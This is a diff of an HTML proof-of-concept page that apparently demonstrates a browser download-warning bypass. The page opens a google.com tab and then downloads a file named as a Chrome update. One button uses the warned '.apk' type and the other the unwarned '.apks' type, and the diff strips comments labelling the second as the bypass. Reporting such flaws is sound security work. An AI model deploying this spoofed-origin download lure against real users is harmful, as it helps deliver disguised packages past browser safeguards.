@@ -27,7 +27,7 @@
       }
       h1 {
         font-size: 20px;
-        color: #d93025; /* Warna peringatan Google */
+        color: #d93025;
         margin-bottom: 10px;
       }
       p {
@@ -47,22 +47,18 @@
         border-radius: 10px;
         cursor: pointer;
         margin-bottom: 15px;
-        transition:
-          transform 0.2s,
-          filter 0.2s;
+        transition: transform 0.2s, filter 0.2s;
       }
       .btn:active {
         transform: scale(0.97);
       }
 
-      /* Button 1: Normal APK (The Baseline) */
       .btn-warning {
-        background-color: #5f6368; /* Abu-abu (Baseline) */
+        background-color: #5f6368;
       }
 
-      /* Button 2: APKS (The Bypass/Vulnerability) */
       .btn-danger {
-        background-color: #1a73e8; /* Biru (Bypass) */
+        background-color: #1a73e8;
       }
 
       .label-status {
@@ -74,10 +70,15 @@
       }
       .status-protected {
         color: #1e8e3e;
-      } /* Hijau - Terproteksi */
+      }
       .status-vulnerable {
         color: #d93025;
-      } /* Merah - Celah */
+      }
+      #status-msg {
+        font-size: 13px;
+        color: #333;
+        margin-top: 10px;
+      }
     </style>
   </head>
   <body>
@@ -107,21 +108,31 @@
       <p style="font-size: 11px; font-style: italic">
         Note: .apks should trigger the same warning as .apk but it doesn't.
       </p>
+      <div id="status-msg"></div>
     </div>
 
     <script>
       function triggerSpoof(type) {
-        // Membuka tab baru ke google untuk mensimulasikan origin spoofing pada UI
-        const targetWindow = window.open("https://www.google.com", "spoof_tab");
         const file =
           type === "apk"
             ? "google_chrome_update.apk"
             : "google_chrome_update.apks";
 
+        document.getElementById("status-msg").innerText = "Menyiapkan download " + file + "...";
+
+        try {
+          window.open("https://www.google.com", "spoof_tab");
+        } catch(e) {}
+
         setTimeout(function () {
-          // Mengarahkan tab yang sudah terbuka ke file download
-          targetWindow.location.href = file;
-        }, 2500);
+          const a = document.createElement("a");
+          a.href = file;
+          a.download = file;
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+          document.getElementById("status-msg").innerText = "Download dimulai: " + file;
+        }, 1500);
       }
     </script>
   </body>
